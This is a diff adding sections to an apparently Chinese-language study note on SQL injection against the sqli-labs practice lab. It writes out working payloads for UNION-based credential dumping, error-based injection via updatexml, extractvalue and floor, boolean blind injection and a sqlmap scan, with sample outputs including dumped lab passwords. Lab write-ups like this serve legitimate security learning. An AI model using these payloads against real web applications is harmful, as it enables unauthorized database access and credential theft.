@@ -247,3 +247,100 @@ Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,adm
 ```
 
 这样就拿到所有用户密码，基础注入点测试。    
+
+#### 更好的联合查询注入
+
+``` sql
+-1' union select 1,2,(select group_concat(concat(username,':',password) separator 0x3c62723e) from users)-- -
+```
+
+这里还是从 users 表里取出所有的 username 和 password 列。但是显示更清楚：  
+```
+Welcome    Dhakkan
+Your Login name:2
+Your Password:Dumb:Dumb
+Angelina:I-kill-you
+Dummy:p@ssword
+secure:crappy
+stupid:stupidity
+superman:genious
+batman:mob!le
+admin:admin
+admin1:admin1
+admin2:admin2
+admin3:admin3
+dhakkan:dumbo
+admin4:admin4
+```
+
+`concat()` 用于拼接多个字符串，`group_concat()` 合并多行数据为一个字符串。通过 separator 将每行数据做分隔符。而 `x3c62723e` 是 `<br>` 的 16 进制表示，这样一来就很清晰了。  
+
+这里的 `':'` 也可以换成 0x3e。  
+
+#### 报错注入
+1. `updatexml()` 
+
+因为 `concat(0x7e, (select database()), 0x7e)` 不是合法的 XPath,但是 sql 会先对 concat 做解析再输出错误，这样就能看到某些内容了。  
+内层的 select database() 可以让我们在错误信息里看到数据库名，用 0x7e 做 ~ 分割。  
+``` sql
+?id=1' and (updatexml(1,concat(0x7e,(select database()),0x7e),1))-- -
+```
+
+输出：  
+```
+ XPATH syntax error: '~security~'
+```
+
+所以当前数据库名是 security，`database()` 也可以换成`user()` 之类。  
+
+2. `extractvalue()`
+
+和 updatexml 差不多。  
+``` sql
+?id=1' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -
+```
+
+输出：  
+```
+ XPATH syntax error: '~root@localhost~'
+```
+
+3. `floor()`
+
+``` sql
+?id=1' and (select 1 from (select+count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+```
+
+输出：  
+```
+Duplicate entry 'root@localhost1' for key 'group_key' 
+```
+
+
+比如用 `updatexml` 查表名，上面已经拿到数据库名为 `security` 了，更深入的：  
+```
+?id=1' and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0, 1),0x7e),1))-- -
+```
+
+取出 (0, 1) 的表名，输出：` XPATH syntax error: '~emails~'` 因为 updatexml 的限制，每次只能取出一个，用 limit 0, 1 之类来取，比如还可以`limit 1,1`、`limit 2,1`。  
+
+……  
+
+#### 布尔盲注
+通过页面真假差异逐字符推断数据的注入方式，即使目标既不回显数据也不显示报错只要页面对不同查询结果有细微差异就能利用。  
+
+``` sql
+?id=1' and (ascii(substr(database(),1,1))>114)-- -
+?id=1' and (ascii(substr(database(),1,1))>115)-- -
+```
+判断数据库名第一个字符的 ASCII 是 115。  
+
+#### sqlmap
+直接用地址：  `sqlmap -u "http://192.168.122.1:8080/Less-1/?id=1"` 这样就可以得到数据库版本信息：  
+
+```
+[16:23:37] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.1
+```
